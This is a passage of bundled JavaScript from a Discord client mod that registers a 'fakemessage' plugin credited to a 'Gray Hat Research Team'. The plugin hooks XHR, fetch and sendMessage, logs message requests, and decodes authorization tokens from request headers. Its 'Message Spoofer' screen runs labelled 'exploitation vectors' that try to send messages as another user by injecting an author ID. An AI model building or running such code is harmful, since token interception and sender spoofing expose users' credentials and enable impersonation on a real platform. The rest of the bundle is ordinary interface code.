...
//# sourceURL=${plugin.id}`;
  ...
  var init_url = __esm({
    "src/core/plugins/quickinstall/url.tsx"() {
      ...
      url_default = () => {
        var patches4 = new Array();
        patches4.push(after("showSimpleActionSheet", showSimpleActionSheet2, (args) => {
        ...
        patches4.push(instead("handleClick", handleClick, function(args, orig) {
          return _async_to_generator(function* () {
  ...
  function patchJsx() {
    ...
    return () => patches4.forEach((unpatch) => unpatch());
  }
  ...
  // src/core/plugins/fakemessage/index.tsx
  var fakemessage_exports = {};
  __export(fakemessage_exports, {
    default: () => fakemessage_default
  });
  function setupNetworkInterception() {
    console.log("\u{1F50D} [RESEARCH] Setting up network interception...");
    var originalXHROpen = XMLHttpRequest.prototype.open;
    var originalXHRSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url2, ...args) {
      this._interceptedMethod = method;
      this._interceptedURL = url2;
      return originalXHROpen.call(this, method, url2, ...args);
    };
    XMLHttpRequest.prototype.send = function(body) {
      var url2 = this._interceptedURL;
      if (url2 && url2.includes("messages")) {
        console.log("\u{1F4E1} [XHR INTERCEPT]", {
          method: this._interceptedMethod,
          url: url2,
          body: body ? JSON.parse(body) : null
        });
        interceptLogs.push(`XHR: ${url2} | Body: ${body}`);
      }
      return originalXHRSend.call(this, body);
    };
    var originalFetch = globalThis.fetch;
    globalThis.fetch = function(input, init) {
      var url2 = typeof input === "string" ? input : input.toString();
      if (url2.includes("messages")) {
        var headers = {};
        if (init?.headers) {
        ...
        console.log("\u{1F4E1} [FETCH INTERCEPT]", {
          url: url2,
          method: init?.method,
          headers,
        ...
        if (headers["authorization"]) {
          try {
            var token = headers["authorization"].replace("Bot ", "").replace("Bearer ", "");
            var parts = token.split(".");
            if (parts.length === 3) {
              var payload = JSON.parse(atob(parts[1]));
              console.log("\u{1F510} [JWT DECODED]", payload);
        ...
        interceptLogs.push(`FETCH: ${url2} | Body: ${init?.body}`);
      }
  ...
  function inspectMessageActions() {
    console.log("\u{1F50D} [RESEARCH] Inspecting MessageActions module...");
    if (!MessageActions2) {
      console.error("\u274C MessageActions not found");
      return;
    }
    console.log("\u{1F4CB} [RESEARCH] MessageActions methods:", Object.keys(MessageActions2));
    var originalSendMessage2 = MessageActions2.sendMessage;
    MessageActions2.sendMessage = function(channelId, message, ...args) {
      console.log("\u{1F3AF} [SENDMESSAGE INTERCEPT]", {
        channelId,
        message,
        args,
      ...
      return originalSendMessage2.apply(this, [
        channelId,
        message,
        ...args
      ]);
    ...
    patches3.push(() => {
      MessageActions2.sendMessage = originalSendMessage2;
    });
    console.log("\u2705 [RESEARCH] MessageActions patched");
  }
  function attemptSpoofedSend(msg) {
    console.log("\u{1F680} [EXPLOIT] Attempting spoofed message send...");
    console.log("\u{1F4DD} [EXPLOIT] Target:", msg.targetUserId, "| Spoofed Author:", msg.fromUserId);
    if (!MessageActions2) {
    ...
    try {
      console.log("\u{1F527} [EXPLOIT] Vector 1: Direct message send");
      var messagePayload = {
      ...
      if (msg.embedTitle || msg.embedDescription) {
        messagePayload.embeds = [
          {
            title: msg.embedTitle || void 0,
            description: msg.embedDescription || void 0,
            image: msg.embedImageUrl ? {
              url: msg.embedImageUrl
            } : void 0
          }
        ];
      }
      ...
      console.log("\u{1F4E4} [EXPLOIT] Sending message...");
      console.log("\u{1F4E4} [EXPLOIT] Channel:", msg.targetUserId);
      console.log("\u{1F4E4} [EXPLOIT] Payload:", messagePayload);
      console.log("\u{1F4E4} [EXPLOIT] Options:", options);
      var result = MessageActions2.sendMessage(msg.targetUserId, messagePayload, void 0, options);
    ...
    try {
      console.log("\u{1F527} [EXPLOIT] Vector 2: Attempting author_id injection");
      var spoofedPayload = {
      ...
      console.log("\u{1F4E4} [EXPLOIT] Attempting to inject author_id:", msg.fromUserId);
      MessageActions2.sendMessage(msg.targetUserId, spoofedPayload, void 0, options1);
      console.log("\u2705 [EXPLOIT] Vector 2 executed (will show YOUR username, not spoofed)");
    } catch (error) {
      console.error("\u274C [EXPLOIT] Vector 2 failed:", error);
    }
    console.log("\u{1F3C1} [EXPLOIT] All vectors executed. Check Discord channel.");
    console.log("\u{1F4CA} [LOGS] Total interceptions captured:", interceptLogs.length);
  }
  function initializeResearchFramework() {
    console.log("\u{1F52C} [RESEARCH] Initializing deep inspection framework...");
    try {
      MessageActions2 = findByProps("sendMessage", "editMessage");
      FluxDispatcher2 = findByProps("dispatch", "_interceptors");
      messageUtil2 = findByProps("sendBotMessage");
      ...
      console.log("\u{1F4E1} [RESEARCH] All network requests to /messages endpoints will be logged");
      console.log("\u{1F3AF} [RESEARCH] MessageActions.sendMessage is now intercepted");
    } catch (error) {
      console.error("\u274C [RESEARCH] Framework initialization failed:", error);
    }
  }
  function FakeMessageSettings() {
    var storage = getSharedStorage();
    var [messages, setMessages] = (0, import_react5.useState)([]);
    var [showLogs, setShowLogs] = (0, import_react5.useState)(false);
    var [state, setState] = (0, import_react5.useState)({
      targetUserId: "",
      fromUserId: "",
      messageContent: "",
      embedTitle: "",
    ...
    (0, import_react5.useEffect)(() => {
      try {
        var loadedMessages = storage.messages || [];
    ...
    var handleDeleteMessage = (id) => {
      try {
        var updatedMessages = messages.filter((msg) => msg.id !== id);
        storage.messages = updatedMessages;
        setMessages(updatedMessages);
      ...
      children: /* @__PURE__ */ jsxs(import_react_native21.View, {
        ...
        children: [
          /* @__PURE__ */ jsx(Text, {
            ...
            children: "Message Spoofer [RESEARCH]"
          }),
          /* @__PURE__ */ jsx(Text, {
            variant: "text-sm/normal",
            color: "text-muted",
            children: "Deep inspection & exploitation framework - All sends are intercepted and logged"
          }),
          /* @__PURE__ */ jsxs(import_react_native21.View, {
            ...
            children: [
              /* @__PURE__ */ jsx(Text, {
                ...
                children: "\u{1F52C} RESEARCH MODE ACTIVE"
              }),
              /* @__PURE__ */ jsxs(Text, {
          ...
          showLogs && /* @__PURE__ */ jsxs(import_react_native21.View, {
            style: {
              padding: 12,
            ...
            children: [
              /* @__PURE__ */ jsx(Text, {
                variant: "text-md/bold",
                children: "\u{1F4E1} Interception Logs"
              }),
              /* @__PURE__ */ jsx(import_react_native21.ScrollView, {
                style: {
                  marginTop: 8
                },
                children: interceptLogs.length === 0 ? /* @__PURE__ */ jsx(Text, {
                  variant: "text-xs/normal",
                  color: "text-muted",
                  children: "No interceptions yet. Send a message to see logs."
                }) : interceptLogs.map((log, index) => /* @__PURE__ */ jsxs(Text, {
                  variant: "text-xs/normal",
                  color: "text-muted",
                  style: {
            ...
            children: [
              /* @__PURE__ */ jsxs(import_react_native21.View, {
                children: [
                  /* @__PURE__ */ jsx(Text, {
                    variant: "text-md/bold",
                    children: "Target User/Channel ID *"
                  }),
              ...
              /* @__PURE__ */ jsxs(import_react_native21.View, {
                children: [
                  /* @__PURE__ */ jsx(Text, {
                    variant: "text-md/bold",
                    children: "Embed Description (Optional)"
                  }),
                  /* @__PURE__ */ jsx(import_react_native21.TextInput, {
              ...
              /* @__PURE__ */ jsxs(import_react_native21.View, {
                children: [
                  /* @__PURE__ */ jsx(Text, {
                    variant: "text-md/bold",
                    children: "Embed Image URL (Optional)"
                  }),
                  /* @__PURE__ */ jsx(import_react_native21.TextInput, {
          ...
          /* @__PURE__ */ jsxs(import_react_native21.View, {
            ...
            children: [
              ...
              /* @__PURE__ */ jsx(Text, {
                ...
                children: "\u26A0\uFE0F Clicking save will execute all 4 exploitation vectors and attempt to spoof the sender"
              })
            ]
          }),
          /* @__PURE__ */ jsxs(import_react_native21.View, {
            ...
            children: [
              ...
              messages.length === 0 ? /* @__PURE__ */ jsx(Text, {
                variant: "text-sm/normal",
                color: "text-muted",
                children: "No cached messages yet"
              }) : messages.map((msg) => /* @__PURE__ */ jsxs(import_react_native21.View, {
                style: {
                  marginTop: 12,
                  padding: 12,
                ...
                children: [
                  ...
                  msg.embedTitle && /* @__PURE__ */ jsxs(Text, {
                    variant: "text-xs/normal",
                    color: "text-muted",
                    style: {
                      marginTop: 4
  ...
  var import_react5, import_react_native21, STORAGE_PATH, sharedStorage, MessageActions2, FluxDispatcher2, messageUtil2, patches3, interceptLogs, getSharedStorage, fakemessage_default;
  var init_fakemessage = __esm({
    "src/core/plugins/fakemessage/index.tsx"() {
      "use strict";
      init_asyncIteratorSymbol();
      init_promiseAllSettled();
      ...
      init_storage2();
      init_metro();
      STORAGE_PATH = "bunny_fakemessage_storage";
      sharedStorage = null;
      MessageActions2 = null;
      FluxDispatcher2 = null;
      messageUtil2 = null;
      patches3 = [];
      interceptLogs = [];
      getSharedStorage = () => {
        if (!sharedStorage) {
          sharedStorage = createStorage2(STORAGE_PATH, {
            dflt: {
              messages: []
            }
          });
      ...
      fakemessage_default = defineCorePlugin({
        manifest: {
          ...
          display: {
            ...
            authors: [
              {
                name: "Gray Hat Research Team"
              }
            ]
          }
        },
        start() {
          console.log("\u{1F680} [FAKEMESSAGE] Plugin Starting...");
          console.log("\u{1F52C} [FAKEMESSAGE] Initializing research framework...");
          initializeResearchFramework();
          console.log("\u2705 [FAKEMESSAGE] Plugin fully operational");
          console.log("\u{1F4E1} [FAKEMESSAGE] All network interception active");
          console.log("\u{1F3AF} [FAKEMESSAGE] Ready to intercept and analyze message sends");
        },
        stop() {
          console.log("\u{1F6D1} [FAKEMESSAGE] Stopping plugin...");
          patches3.forEach((unpatch) => unpatch());
          patches3.length = 0;
  ...
  var init_plugins2 = __esm({
    "src/core/plugins/index.ts"() {
      ...
      getCorePlugins = () => ({
        ...
        "bunny.fakemessage": (init_fakemessage(), __toCommonJS(fakemessage_exports))
      });
    }
  });
  ...
  var import_chroma_js4, import_react6, import_react_native22, CardContext, useCardContext, Actions;
  ...
  var import_react_native26, hideActionSheet2, showSimpleActionSheet3, useStyles2;
  ...
  function FontPreview({ font }) {
    ...
    var paragraph = (0, import_react9.useMemo)(() => {
      if (!typeface)
        return null;
  ...
  var Skia, import_react9, import_react_native29, useToken2;
...
Type: ${asset.type}`,
  ...
  var import_react11, import_react_native32, displayable2;
  ...
  var import_react_native33, import_react_native34, hideActionSheet4, showSimpleActionSheet5, openAlert5, AlertModal6, AlertActionButton6, RDT_EMBED_LINK, useStyles3;
